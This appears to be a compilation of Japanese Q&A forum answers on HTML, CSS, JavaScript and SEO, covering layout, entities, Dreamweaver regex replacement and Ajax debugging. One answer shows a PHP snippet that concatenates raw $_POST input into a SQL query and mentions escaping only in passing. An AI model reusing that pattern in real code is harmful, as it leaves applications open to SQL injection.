HTMLはWeb用スクリプトの数ある中の１つで、非常に単純な事しか出来ない反面、どんな機種（古い機種）でも扱える為、だれでも見れるページを作成できるメリットを生かしてホームページに多く採用されています。但し必ずではなく、数ある中の１つでしかありません。 例えばJAVAAppletは一つのWebで使える言語です、他の言語でもWebページの作成は可能ですし、かなり高度な事も可能です、スクリプトにおいてもその数は多く目的により使い分けられます、無論HTMLからリンクして使うことも出来ます。 例えばFLASH等で作られたホームページは、FLASHを導入していない人のために、TOPページだけHTMLでFLASHの導入が出来るようにリンクを貼ったりメッセジを入れたりしている場合もあります。 HTMLが多く使われる理由の一つがどんなデバイスでも閲覧できると言う事で、保訪問者のために、Webページを見るために必要なプラグインやアドオン等のリンクや、その表示の為と言う部分がほとんどですTOPがHTMLで後はそれぞれのスクリプトや言語と言う場合が多いのでは無いでしょうか？
No.1です。 記載のページを調べてみましたところ、 <h1>テンプネート製作所 株式会社のホームページです。～</h1>に高さを指定していないのが原因です。 こちらに line-height:15px; （font-size:10px; を指定しているので、line-height:1.5em; もしくは line-height:150%; でもOK） を指定すれば、ロゴが下にはみ出なくなります。 その他のOSやブラウザではみ出ていないのは、デフォルトのフォントとline-heightの違いによるものでしょう。 Winにヒラギノをインストールしていなければ、このページは Win Fx では MS P ゴシックが使用されます、Mac Fx ではヒラギノが使用されます。 Mac Fx と Safari のフォントは同じヒラギノですが、font-size:10px;に指定したとき、デフォルトのline-heightは、Fxでは16px、Safariでは15pxになっている模様。 このようなブラウザ間のデフォルト設定の違いをなくすため、リセットCSSがよく使われます。 検索すれば色々出てくるでしょう。 また、かなり古いテンプレートと思いますので、tableタグでレイアウトしていますが、あまり好ましくはありません。
タグは <E attoribute=""> E:Element(要素)===タグでマークアップされた内容の種類を示す。 attribute: 属性 の組み合わせです。 <p style=""></p> <a href="[URL]" title=""> などの、p,aが要素(Element)で、styleやhref,titleが属性、その値が属性値になります。 これらは、 HTML 4.01仕様書 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )の後ろにある ・要素索引 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・属性索引 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) をご覧になるのがわかりやすいです。 ちなみに 要素索引でA(意味はAnchor)でクリックすると 12.2 A要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) styleは style = style [CN] ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) このstyle属性は、別途スタイル--プレゼンテーションを指定する属性です。
動的なコンテンツを含むなら意味があります。 JSPなどで生成するhtmlにはつけることが多いですね。
　ページレイアウトをtableで行う方法は、否定され始めて１０年以上たつとても古い方式です。「単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … --199年勧告のHTML4.01仕様書より)」この掲示板でも久しく見ない質問です。 　できれば全面的に見直したほうが良いでしょう。 　基本的には、 body>table{margin:0 aut0;} 　でしょう　 　タグの閉じ忘れを防ぐために、きちんとインデントさせて記述するほうが楽ですね。 <body> 　<div class="header"> 　　<h1>見出し</h1> 　　<p>簡単な説明</p> 　</div> 　<div class="section"> 　　<h2>本文見出し</h2> 　　<div class="section"> 　　　<h3>項見出し</h3> 　　　<p> 　　　　記事・・・・・ 　　　</p> 　　　<p> 　　　　記事。。<img src="" width="" height="" alt="">記事・・ 　　　</p> 　　</div> 　</div> のように・・・。HTMLでは、半角スペース、タブ、改行などは空白文字として扱われます。 ★9.1 空白類 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
HTMLはHyper Text Markup Languageの略で、文章をタグを使ってマークアップする方式なのですが、そのマークアップに使われる、一部の文字はそれ自体がHTML上で意味をもつめために、その文字が使えません。 　< や >　はわかりますよね。これらを書くときには、&ltl; &gt;と書かなければなりません。 　同様に 　" と & は&quot; &amp; です。 ※この方法を文字実体参照といいます。 　また、目的は異なりますが、キーボードから入力できない文字などにもいくつか定められています。 　 はそこで折り返しをしない半角スペースを表します。 読んでおくべきところ ・5.3 文字参照 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・HTMLで使える文字実体参照 ( http://www.ne.jp/asahi/minazuki/bakera/html/refe … )
>スマートなやり方をご教授ください。 ひと言で言えば、臨機応変 (◦´꒳`◦)ドヤァ http://www.w3.org/TR/html5/the-img-element.html# … <img>の使い方（どのタグで囲むのか）として、様々な方法が書かれています。 HTML4では<p><img></p>というならびが推奨されると思いますが、 もともと<img>は<object type="image/***"></object>の短縮形ですから、<p>に入れなければならないというわけでもないと思います。 --------------- 他に適切な要素が無ければ<p>を使うというのがいいと思いますが、 http://www.w3.org/TR/html5/the-p-element.html#th … <p>要素解説の最後、 段落の中に他の要素が入る場合、<p><ul><p>というならびにしても良いし、<p>をやめて代わりに<div>を使用する方法でも良い、とあります。 （そもそも日本語や英語の文法（１つの文（段落の一部）の中に箇条書きが入ることがある）とHTMLの文法（段落の中に箇条書きを入れては行けない）に矛盾があるため、他にやり方が無いというのも理由の一つです。） HTML4、XHTMLは文書（文字によるもの）を基準として作られた文法/仕様ですが、 HTML5で作られる文書は文字とは限りませんし、それが段落とは限らないと思います。 それ（段落ではない"ブロック要素"）に対して、最小単位である<p>を使っても良いし、汎用要素である<div>でも良いし、だと思います。
Javascriptのイベントハンドラは Inputタグの近くにあるとは限りません。 最近はhtmlに直接書かないのが主流になりつつあります。
それ以外に Dreamweaver にテンプレートという機能があります。 共通するヘッダー、フッター、ナビなどをテンプレートファイルにして、一括で管理できる機能です。 テンプレートファイルを編集するだけで、そのテンプレートを使用している全てのページに反映されます。 しかし Dreamweaver のみの機能なので、あまりお勧めはできません。 手軽にできてオススメな方法はやはりSSIかPHPになります。 ナビの部分を別のHTMLかPHPにして、本体ページ内にインクルードの一行を入れるだけ。 SSIインクルードとか、PHPインクルードとかで検索すれば色々出てくるでしょう。 SSIとPHPとかが使えないサーバなら素直にコピペするしかないでしょう。 JSはセキュリティ上やめた方がいいでしょう。
右クリック禁止は利かなくすれば良いです。 ブラウザはfirefoxをお使いなさい。 　ツール→オプションにて、[コンテンツ]を選択するとjavascriptを有効にするか無効にするかが選択できますが、無効にするか、有効のままで[詳細設定]からコンテキストメニューのチェックを外せばよいです。 　firefoxの開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … )にはたくさんのそのような用途に使うアドオンがあります。 ・JSView ( https://addons.mozilla.jp/firefox/details/2076 ) 　はjavascript動作後のソースやjavascriptを見れます。 　firefoxのコンテキストメニューからソースを表示でも利用できます。 ・Firebug ( https://addons.mozilla.jp/firefox/details/1843 ) 　サイトの情報を調べるには必須です。 　HTMLソースは無論、それにどのようにスタイルシートが適用されているかなど など、多すぎて困るかも Tab Mix Plus ( https://addons.mozilla.jp/firefox/details/1122 )があれば、新しいウィンドウで開くリンクを別タブで開くこともできるので、ツールバーがないなんてこともないでしょう。 　あなたが開発者なら ・Html Validator ( https://addons.mozilla.jp/firefox/details/249 ) ・Web Developer ( https://addons.mozilla.jp/firefox/details/60 ) ・Live HTTP Headers ( https://addons.mozilla.jp/firefox/details/3829 ) ・Open With ( https://addons.mozilla.jp/firefox/details/11097 ) などもあると便利でしょう。 拡張子は関係ありません。出力されているのはtext/htmlでしょうから・・
OOCSS が人々に推奨されているかどうかに関して，CSS フレームワークの存在が一つの回答になると思います。 私は，CSS フレームワークの存在数が OOCSS（的な考え方）の肯定され具合だと捉えています。 CSS フレームワークとして Twitter Bootstrap のようなユーティリティクラス群や，960gs, Blueprint などのグリッドシステムが有名です。 これらは，たとえば .btn（ボタン）などのあらかじめ定義されたクラスを適用することでデザイナーでなくともそれなりの見た目を作成できるというものです。 すでにご存知かもしれません。 CSS フレームワークではデザインのために HTML を組み，デザインのためのクラス名を当てます。 先のボタンの例で言えば，.btn.btn-small のように視覚を表す語句を使ったり，ドロップダウン式のボタンあることを示すため <span class="caret"></span> という空要素を挟んだりします。 グリッドシステムでは 220px 幅のカラムレイアウトのために .col.span-3 を用います。 このやり方は人々の指摘通り，セマンティクスを失わせる記法です。 しかしこのような CSS フレームワークは数多存在し，実際 多くのフロントエンド開発者たちに重宝されているようです。 文書構造と見た目が分離されていない，旧時代のテーブルレイアウトのような手法がとられているのです。 tkmojo さんが気乗りしないのも非常に共感できますが，一方フレームワークの便利さも感じています。 私は最近 出身のラボのために Web ページを提供したのですが，そのケースではセマンティクスよりも『素人でも保守・変更することができる』ことを重視しフレームワークを用いました。 ページを追加するのは現役のラボメンバー，つまり素人（しかも化学系でプログラミングなどとは無縁）ですから，セマンティックな文書構造は期待できませんし，CSS についても同様です。 <section id="about-lab"> とし CSS 側でがんばってもらうよりも，<div class="col span-3 right"> と書いてもらう方が省力的と考えたのです。 理想的な HTML, CSS ではない手法が人気を博する理由として，理想的な情報構造は高度なスキルを要求するという点も大きいですが，CSS という発展途上な言語も要因にあると考えています。 ユーザエージェント（ブラウザ・デバイス・使用者）に依存しない情報構造を持つ HTML が理想ですが，その理想的な HTML を要求の見た目にするには，CSS はまだまだ力不足と言えます。 つまり，HTML 側に余計な要素を追加して補助してやる必要があるのです。 div#wrapper まみれの非セマンティックな HTML ができあがるのも仕方がない面はあるでしょう。 その現れ方の一つとして OOCSS や CSS フレームワークがあるのだと思います。 情報を構造づけることの難しさ・言語仕様や対応状況の限界から来る手間と，簡単さ・再利用性のトレードオフから OOCSS や CSS フレームワークが肯定されているのだと思います。 私もはじめ否定していましたが，上記のように考えていくうち特に否定することもないと思うようになりました。 Bootstrap くらいうまくまとめてあれば，それほど醜い HTML にはならないと思います。 理想的な HTML, CSS を書くことができる時代が来るまで，OOCSS, CSS フレームワークは選択肢であり続けると考えています。
tableをまず書きます。excelなどで作成してCSVにしてそれを置換すると楽でしょう。 <table summary="fruitList"> 　<caption>果物一覧</caption> 　<thead> 　　<tr> 　　　<th abbr="name" rowspan="2">果物</th><th abbr="details" colspan="3">詳細</th><th abbr="term" rowspan="2">賞味期限</th><th abbr="sold" rowspan="2">売却</th> 　　</tr> 　　<tr> 　　　<th abbr="arrive">入荷日</th><th abbr="price">単価</th><th abbr="number">数量</th> 　　</tr> 　</thead> 　<tbody> 　　<tr> 　　<th abbr="apple">リンゴ</th><td>2012/12/1</td><td>200</td><td>10<td>2012/12/7</td><td>250</td> 　　</tr> 　　<tr> 　　<th abbr="melon">メロン</th><td>2012/12/2</td><td>500</td><td>5<td>2012/12/8</td><td>530</td> 　　</tr> 　</tbody> </table> table[summary="fluitList"]{border:none;border-collapse:collapse;width:60%;min-width:400px;} table[summary="fluitList"] th,table[summary="fluitList"] td{border:solid 1px gray;position:relative;} table[summary="fluitList"] thead th{background-color:rgb(180,255,180);} table[summary="fluitList"] thead th[abbr="term"], table[summary="fluitList"] thead th[abbr="sold"]{background-color:rgb(255,180,180);} table[summary="fluitList"] td{text-align:center;} table[summary="fluitList"] td+td{text-align:right;} table[summary="fluitList"] td+td+td+td{text-align:center;} table[summary="fluitList"] td+td+td+td+td{text-align:right;} table[summary="fluitList"] th[abbr="term"]:after{content:"★";position:absolute;left:0;top:-2em;color:red;}
＞ulの下に、pやtableが来た場合、ulのmargin領域と同じ指定をする必要があると考えています。 　ここが、間違っているのですよ。divは、汎用ブロックと言って文書構造上でひとつのグループに所属するものを他と区別するために用いるものです。 　ulに続いて、同じ構造に属する段落やtableがあればそれらを括ってグループ化するために使用するのです。デザインは忘れてください。 HTML5で考えると理解しやすいと思いますのでHTML5でマークアップすると <section id="WhatIsCPU"> 　<h1>CPUとは</h1> 　<p>CPUは、コンピュータの頭にあたります。以下種類のものがあります<p> 　<section> 　　<h2>主なメーカー</h2> 　　<p>主要なナメーカーには・・・・</p> 　　<ul> 　　　<li>Intel</li> 　　　<li>AMD</li> 　　　<li>Qualcomm</li> 　　</ul> 　　<section> 　　　<h3>Intel</h3> 　　　<p>Intelは・・・</p> 　　</section> 　</section> 　<section> 　　<h2>CPUの仕組み</h2> ・・・【中略】・・・ 　　<figure>。。</figure> 　</section> </section> となるでしょう。HTML4だと、それぞれが、<div class"section">になるだけです。あなたが本を書くときに、節、章、項・・・と階層を作ることを意識すれば良いです。Texの経験があればよいのですが。 　(ちなみにHTML5ではひとつのsectionにひとつの見出し(heading)のみ入ります。) ---------------------- ＞もし、h2の下に「ul、p、table」タグが出てきた、同じ左余白を要求する場合、 ＞「ulで指定」「pで指定」「tableで指定」と ＞3回も指定することになり修正するにしても手間かなと思ったのです。 　それらも字下げしたいということは、【必ず文書構造もそうなっているはず】なのですよ。この様にデザインしたら理解しやすいとイメージされた時点で、それは文書構造から来る必然だと考えてください。 　そして、その文書構造をHTMLできちんとマークアップしていけばよいのです。 　HTMLがきちんとできていないと、いちいちmarginを指定したり、classをたくさん振ったりすることになるのです。 上記の例で言うと単に section{margin-left:1em;} とするだけで、節→章→項と下るたびに一文字ずつまとめて字下げされるはずですし、 body>section section section{margin-left:0;} で項以下のブロックの字下げはされなくなるはずです。 ＞例えclassを付けたとしても、その3つのタグにclassを付与するという3度手間が発生すると思ったのです。 　div.section ul,div.section p,div.section table{margin-left:1em;} いちいちつける必要なんてないですし、こう書く方がとsection(本文)の中のul,p,tableというブロックは字下げしているとわかりやすいです。いっそのこと 　div.section>*{margin-left:1em;} で良いかも。 　この二つ-----------以下はHTMLがきちんとマークアップされていないときの代替方法です。HTMLさえきちんと書けていれば、こんな複雑なことをする必要はありませんね。 <div class="box">なんてclass名をつけなくなったらこの段階は卒業かな。 　　
すみません、補足です。 HTML5では、属性値として使える言葉は自由です。 ブラウザや検索ロボットで使われている共通仕様を使っても良いですし、 自分でHTML解析ツールを作って、それようの属性を作っても良いです。 自分用の属性値を使っても、あくまで自分用にすぎませんから、他のブラウザや検索ロボットはこれらの情報を単純に無視します。 SEOやそういう目的で作るのであれば、自分用ルールを使う意味がありません。 （相手に理解されない言葉を使っても会話出来ないのと同じ）
あまり感心しませんが・・ メールをHTML形式で記述し、 <img src="http：/*****" width=****> と普通にソースを書いてください。 メーラー側でHTMLメールを作成するほうが良いです。 なお、HTMLメールが感心しないのは、必ず読んだ人の情報が補足されるからです。 [例] <img src="http：/*****" width=****> のURL部分は拡張子やQUERY_STRINGSに関わらず、そのメールを受け取ったとか、そのメールアドレスが有効だとかの単純なものから、より様々な情報を受け取る技術があるからです。 　私は、メーラーで「リモート画像を開かない」設定にしています。
複数行の置き換え、(フォルダを指定してなど)複数ファイルの一括置き換えができるなら、なんでもいいわけですよね。 多くの(それなりに高機能な)テキストエディタで可能だと思いますが。 無料でならEclipseがお勧め。
TPOで意味は変わるでしょう。 ＞動的のサイト 　　　　^^^^^^サイトですから、 動的なページでしたら、 ・アプリケーションサーバーなどで、データーから動的にページを作成している。 　　PHPなどで、データベースからページを作成している ・ユーザーの動作によってアクティブにページを変化させているページ 　　かってのDHTMLや現在のAjax、JQuery 　googleMapが有名 などですかね。 　なお、URLや拡張子は一切関係ないです。--お馬鹿なWindows以外は拡張子の制限はありません。
JavaScriptでこのような処理をするのは間違っていません JavaScriptが絶対に動かない環境まで考慮するのなら その前にFlashやCSS、ページ幅等を気にしないとおかしく現実的ではありません それに最近では検索エンジンは大方のスクリプトを実行できるのでクロールもされます それから、Chromeのコンソールで表示されるソースは「現在」のドキュメントソースです どこを見ればJavaScriptで書き出していることがわかるかという問いですが、 そりゃあもう元ソースに無いものが現れているという時点で99.9％JavaScriptによるものでしょう 具体的にどうやれば辿っていけるのか私が実際にやった例を挙げると、 まずJavaScriptで書き出されていると思われる部分 今回だと「東京23区内」とか書かれている右の辺りを右クリックして要素を検証します そうしてソースと比較するか、カンで、 <div id="index_13_0" class="loading"></div> の中に新しく要素が作られていることがわかります つまり"index_13_0"というidをターゲットにして埋め込んでいるのかなと推測できます 次にsourcesタブを開き、「Ctrl+Shift+F」を押して検索ウィンドウを開きます 「Ctrl+F」ではダメです、今見えている対象ではなく全ソースから検索する場合は必ずShiftも押してください そうして「index_13_0」と入れ検索してみます JavaScriptファイルにヒットして欲しいのですがhtmlしかヒットしません もしかすると数値の部分は可変で 「"index_"+i」のような処理になっているのかと推測し、 次に「index_」と入れ検索してみます またhtmlにしかヒットしません ここで、他にスクリプトからターゲットにできて、各場所で共通な部分として、あとはClassがあることがわかります そうして今度は「loading」で検索してみます たくさん候補がでますが、自分のところのデータ管理スクリプトを他ドメインにおいておくことは考えにくいので、「kobetsu.co.jp」ドメインでスクリプトファイルのものだけに注目します そうすると「map.php.js」というのが目に付くと思います それを開くと２行めと６行目がヒットしています jQueryプラグイン用の記述がされていて、 ２行目は「loading」Classをもつ要素に「Loading...」と表示させ、 ６行目で各要素に何かやっていることがわかります そして６行目をクリックすると該当部分は $(".loading").each(function(){ $(this).load("query/list.php?q="+$(this).attr("id")); }); となっています これはAjaxで、「query/list.php?q=(各要素のid)」から取得したデータを各要素に書き出す処理です これで一応わかったわけですが、ついでにNetworkタブを開きます そして「コンソールを出したまま」一旦ページを再読み込みさせます 次に「Ctrl+F」を押して検索ウィンドウを開きます そして「list.php」と入れて検索します そうするとヒットするので 「東京23区内」の内容だと思われる「list.php?q=index_13_0」をクリックします そうしてResponseタブにすると期待していたデータが出てきます 大体こういった流れです、一番の味噌は「Ctrl+Shift+F」です
折角、CSS Dencitie ( http://www6.plala.or.jp/go_west/nextcss/index.html )をご存知なら、１度目を通しておきましょう。ここで説明するよりは、はるかに身につきます。ピンポイントでその部分だけ聞いてもいざ使おうとしたら応用が利かないです。 スタイルシートのリンクに関する擬似クラスと動的な擬似クラスを使います。 ・セレクタ - CSS Dencitie ( http://www6.plala.or.jp/go_west/nextcss/ref/slct … ) 　→疑似クラス 　　→リンクの疑似クラス 　　→動的な疑似クラス を使用します。 a要素(インライン要素)をblockに変更するのは、すでに「"display: block"なリンク ( http://www6.plala.or.jp/go_west/nextcss/tip/tech … )」で理解されていると思いますので、後はそのblockになったa要素に対して、動的な擬似クラスで背景色などを指定してみましょう。
<OPTGROUP label="PortMaster 2"> は単に<option>をグループ化するための要素ですから、name、valueを持ちえませんからできません。もしそうなら <select name="course"> <option selected>▼旅行コースを選択してください</option> <option value="lunch">食事</option> <optgroup label="お食事とご入浴"> <option value="lunch01">【日帰り】和食・温泉コース</option> <option value="lunch02">【日帰り】洋食・温泉コース</option> <option value="lunch03">【日帰り】食べ放題・温泉コース</option> </optgroup> <optgroup label="ご入浴のみ"> <option value="spa01">【日帰り】温泉Ａコース</option> <option value="spa02">【日帰り】温泉Ｂコース</option> <option value="spa03">【日帰り】名湯めぐりコース</option> </optgroup> </select> で良いのでは？ 　グループ化する意味がないのですから、単独で<option>にすればよいのでは?
こんにちは。 > 運用中のシステムですが、今までIE6を推奨して使っていただいてたのですが、 > エンドユーザよりIE8で使いたいが大丈夫か？と問い合わせがありました どこでも聞くお話で、いやまったく大変なことです。 自分も最近取り組んでいますが、CGI（自分の場合はPHP）で本当に大変です。 社内システムをXP SP2/IE6限定で作りまくった連中にこの現状を直視してもらいたいです。 自分の会社の場合は、情報処理関係の中堅企業が作ったプログラムを修正していますが、PHP部分も非常に汚く、閉口します。 > IISサーバのプロパティのカスタムヘッダに > 　　X-UA-Compatible：IE=EmulateIE7 > のような設定をすれば、IE8でもうまく動くでしょうか？ うまく動きません（泣。 IE6はIE7ともまったく違います。IE7互換表示しても改善されません。 機能的な問題は、少なくともサーバサイド部分は、Webアプリなのであまり問題はないと思います。 問題なのはCSSに起因する表示崩れで、画面が重なってボタンが押せなくなったり、floatが狂って表示が分断されたり、「崩れ」という言葉では言い表せないような破滅的な状態です。 （少なくとも自分のケースでは） 画面数が100以上あるので、目も当てられません。 > なるべく早く対応するように言われているので ご愁傷様です。受けた以上仕方がないですね。お互いに（泣
＞　自分自身を呼ぶというのがポイントですか？ そういう事です。 検索条件を生成する所で判定を一つ入れるだけで済むので、わざわざ分けて複数作る必要はありません。 $Sql = "select * from hoge"; if (isset($_POST['条件']) && $_POST['条件'] != '') { $Sql .= " where key = '" . $_POST['条件'] . "'"; } $Sql .= " order by xx"; みたいな感じでSQL文を生成するようにすれば、ひとつのロジックで対応できます。 （端折ってますがPOSTされてきた値のエスケープ処理はちゃんとやってくださいね）
まず <ul□id="navi"> 全角スペースが入っているので正しく表示されません。 次に #navi ul とは、#navi の中に入っている ul という意味になりますからご注意を。 #navi ul {list-style: none; margin: 0; padding: 0;} ↓ ul#navi {list-style: none; margin: 0; padding: 0;}
divタグでidで動いてclassで動かないものは少なかった気が・・ 単純にCSSの記載ミスでは？.(ドット)と#の間違いとか。 ソースが無いのでハッキリとはわかりかねますが、回り込みと幅指定、絡んでるのはこの変じゃないでしょうか。
＞　そもそもindex.htmlに記述したメタタグによってindex.htmlページ内のリンクを辿らないわけなので、その他のファイルにあえてメタタグを何も書かなくてもその他のファイルはindex.htmlから辿られず、インデックス化されない気がするんですがどうなんでしょうか？ index.htmlから辿ってくることは無いでしょうが、外部から特定のページにリンクが張られるとロボットはやってきますよ。
No.3です。 一応技術資料ということで出し惜しみ、ごまかさせてください。 float:leftにすれば横並びになります。 内容的にはNo.2と同じです。 <table>を使っては行けない、つまり、<table>以外のタグを使ってスタイルシートでテーブル状（格子状）に並べろ、ということです。 ORUKA1951さんが素材一覧表を作られる時に、どんなタグ、どんなスタイルシートを使われてるのかわかりません。ただORUKA1951さんの今までの発言から察すると、そうとう<table>嫌いのようですので、やはり<table>以外のタグを使って格子状に並べられていると思います。 その方法についてはご本人に聞いてください。
display:noneとdisplay:blockを切り替えるJavaScriptのfunctionに テーブルのHeightを変える関数を入れちゃダメですか？ 全然的外れだったりして…
いわゆるフォームメールと呼ばれるものの一種です。 フォームメールを作成した経験があれば簡単でしょう。本文がHTMLに変わるだけです。 Perl,sendmailまたはqmailが使える必要があります。 メールフォームCGI配布 商用フリー | PGD WORKS ( http://pgd.jp/cgiscript.html ) など、「htmlメール cgi - Google 検索 ( https://www.google.co.jp/#hl=ja&sugexp=cpmergend … )」で探してください。
CSS3の@font-faceプロパティを使っています。
No.1です。 画像を含め、様々なファイルが存在しますが、それを整理するのはあなたのMy Documentの整理と同じです。 　もし、それぞれをフォルダーに分けるなら、 |--PC/ 　　|--index.html 　　|--images 以下のファイルで共通に使用する画像 　　|　　|-- Photo 　　|　　|-- fig 　　|--WhatCPU 　　|　　|-- index.html 　　|　　|-- CPU.html 　　|　　|-- kindsCPU.html 　　|　　|-- images/ 以下で利用する画像 とかに分けるでしょう。あなたの場合は、それぞれのファイル数が少ないので、同じ階層に入れたほうが良いように思います。 　これは実際の製作工程を考えれば良いです。 まず、たった一つの巨大なHTMLを作成します。これは本、texで論文を書くのと同じです。 　　Tex　　　　　　　　　HTML5 chapter（章）　　　<body>---<header> section（節）　　　　|-- <section> subsection（項）　　　|　　|--<section> subsubsection（目）　|　　|　　|-- <section> paragraph（段落）　　　|　　|　　|　　|--<section> subparagraph（小段落）|　　|　　|　　|　　|--<section> そのうえで、これではあまりにも閲覧には不便なので、それぞれの節なり項で切り分けてページを作成するという手順を踏むことが多いと思います。 　これが、製品紹介などでしたら、製品ごとにフォルダーを作ることになるでしょう。 　あなたの場合は、すべて同じ階層に入れたほうが良いように思います。 ★Windows使いには想像もつかないのでしょうが、UNIXの世界では複数の単語からなるファイル、ディレクトリ名は、whatIsThisのように単語の先頭を大文字にしてきました。Winowsは大文字と小文字を区別しませんし、フォルダー名に半角スペースを含むことができますがUNIXは伝統的に大文字小文字を区別しますし、ファイル・フォルダーに半角スペースは使いませんから、この様に書くことが多いです。 　なお、タグを半角アルファベットで書くのはXHTML---XMLとの整合性のためであって、ファイル名は大文字を使って構いません。 　なお、01:のような章番号、項番号は記事には書かないほうが良いです。途中に記事が挿入されたり、移動したりすると全部書き直さなければならなくなります。counterというプロパティがあるので、それで番号を振れば良いです。各ページに分けたときには<head></head>内でセットすれば良いです。
横やりを指すようですが、それくらいで十分じゃないですかね・・・ 何が目的化にもよりますが それよりもその後の集客を考えたらいかがでしょう。 HTML　LINTやCSSで１００点を取ってもSEOの順位には関係ありませんし・・。 コーディングの美しさよりも、LPO（キャッチコピーやレイアウト）のほうが売上を左右します。
できたものからアップしても良いでしょう。ただし、リンク切れはないように。 SEOを誤解されています。(検索エンジン最適化-Search Engine Optimization))のことで、このWikiの説明にも誤解があるようですが、要は検索エンジンがサイトやページのコンテンツを正確に理解できるように最適化するという意味です。検索結果で上位に表示されるのは、その結果です。あなたのサイトのコンテンツを正確に理解し、あるテーマ、キーワードで検索されたときに、あなたの作成したページがその情報をもっとも良く説明していると判断されれば、上位に表示されます。そのためにはあなたのサイトなりページが正確に理解できなければなりません。 　詳しくは、ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ ( http://support.google.com/webmasters/bin/answer. … )などをお読みください。
原因は、示された情報だけでは判断できません。 そこで、画像の表示方法を示しておきますので、順を追って確認してください。 <img src="[URL]" width="[幅]" height="[高さ]" alt="[代替テキスト]"> [URL] 画像までの正確なパスを記述します。 ・相対パスもしくは絶対パスで指定します。 　bannnerは、./bannerと同じ意味でそのHTMLがおかれているディレクトリ内のディレクトリを示します。 　/で始まる場合は、そのサーバーのルートから 　../は、ひとつ上の階層、../../はふたつ上の階層を示します。 ・半角/全角、大文字小文字の区別を正確に 　Windowsの場合、フォントにプロポーショナルを使用していると判別し難い場合があります。 [幅][高さ]はピクセル数で指定します。 [代替テキスト]画像が表示されないときに表示されるテキスト---画像がなくても意味がわかるように詳しく書きます。alt="犬を連れて散歩している写真"などのようにね。 <img src="banner/test.jpg" width="200" height="40" alt="これはテスト画像"> としてブラウザで見たときに、200×40の場所を確保して、そこに「これはテスト画像」と表示されるなら、その画像を右クリックしてコンテキストメニュー(その場で可能な操作のメニュー)から、画像だけを表示にして見ます。 　ブラウザには何も表示されず、ブラウザのアドレス欄に、そのファイルの[URL]が表示されるはずです。 　・・それと、ブラウザのメニューから「開く」を選択して、画像を見つけ出して表示させたときのURLと比較してみてください。 　なお、一度 ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　などを一通りこなしておくことをお勧めします。
技術的には気にすることはないと思いますが タイトルはあくまでタイトルであって文章ではありません 句読点は文章の区切りですからタイトルに句読点をいれることは あまり勧められた表現ではないと思います 藤岡弘、やモーニング娘。レベルの話ではないでしょうか
非推奨というのはXHTMLを使っているということでしょうか？ 確かにXHTML 2.0ではソースコードを書くのにはpreではなくblockcodeを使うように推奨しています。 http://www.w3.org/TR/xhtml2/mod-structural.html# … (でも、これを知っているならもうblockcode使ってますよね...) しかしながら、HTML5の草稿を見る限り、ソースコードはpreでcodeを囲んでで書くようです。 http://dev.w3.org/html5/spec/the-pre-element.html HTML4.01など古いHTMLではpreとの組み合わせについてはそこまで言及していないように思いますが、HTML5でpre + codeになったということはこれまでその使い方をされるのが普通だったと予想します。 http://www.w3.org/TR/html401/struct/text.html#h- … というわけで、XHTMLで書いているならblockcode、HTML5で書くつもりならpre + codeが推奨される方法だと思います。
SEOでもリスティングでも基本です。 リスティングなら、入力しないと進めないので分からないということはないでしょう。 SEOは、タイトルタグに入れて、そのキーワードを入れ込んだ記事を書いて、外部要因をがんばってください。 スモールキーワードなら簡単にそれで出ます。 ※SEOの場合、自サイト内のページが食い合わないようにタイトルタグをユニークにしてください。 （同じタイトルタグのページが複数ある、という状況を避けてください）
単純にスタイルシートに input[type="submit"]{border:none;background-color:transparent;} だけじゃまずいのですか？ HTMLに直接書いても <input type="submit" value="送信" style="border:none;background-color:transparent;"> javaccriptが無効なブラウザでも関係ないし・・
読み込むという意味がわかりません。 添付ファイルでしたら、そのままのはず テキストエディタで開いて、コピーペースト--整形せずに張り付け--すればよいはず
もしかすると、海外の方の環境が影響しているのではないでしょうか？ 例えば、その方は、会社のＰＣを使っていて、決められたＵＲＬだけしかアクセスできないように制限されているとか、そもそも日本へのアクセスが禁止されているとか・・・。
/cgi-bin/FormMail.cgi は、ご利用のISPのサービスとしてインストール、設定済みですか？ 　なお、フォームにメールアドレスを記述したらダメです。SPAMが大量に届き始めますよ。メールフォームを使用するのでしたら、メールフォーム側で設定しましょう。 　そして、HTMLの問題ですが、(本題とは関係ありませんが) <form>は使わないように <br>を連続してスペースを調整しないように <form>は<body>内に直接書けません。 　FormMail.cgiのマニュアルを読んでみましょう。
同じ構成のフォームをチェックする汎用的な処理は return chkInputForm(this) としてフォーム自体をわたし function chkInputForm(f){ f.elements・・・・ というような処理にすると効果的です
requestFullScreenを使ってください webkitなら document.documentElement.webkitRequestFullScreen() mozなら document.documentElement.mozRequestFullScreen() スタイルシートが上手くかからないときはdocument.bodyにしたらいいです
HTML5でもmeta要素は存在します。 4.2.5 The meta element ( http://www.w3.org/TR/2011/WD-html5-20110525/sema … ) しかし、.htaccessで指定するほうが楽でしょう。
<td align="center">日本語</td><td>数字＋日本語</font></td> これを正規表現Dreamweaver式に訳すと <td align="center">(.*?)</td><td>(\d.*?)</font></td> となります。 (.*?)が記憶する任意の文字 \dが任意の数字です。 このあたりはDreamweaver置換ヘルプを参照し、自分に関係ある場所だけ覚えていくといつの間にか出来るようになります。 で置換後は <td align="center">$1</td><td>$2</td> （）内で記憶させたものを呼び出すのが$で記憶した順番に123……となります。 つまりDreamweaverの置換窓に 選択対象：フォルダまたはサイト内の…… 検索：ソースコード 検索：<td align="center">(.*?)</td><td>(\d.*?)</font></td> 置換：<td align="center">$1</td><td>$2</td> で一発です。不備があるといけないので、元ファイルのコピー等の安全対策は行ってください。
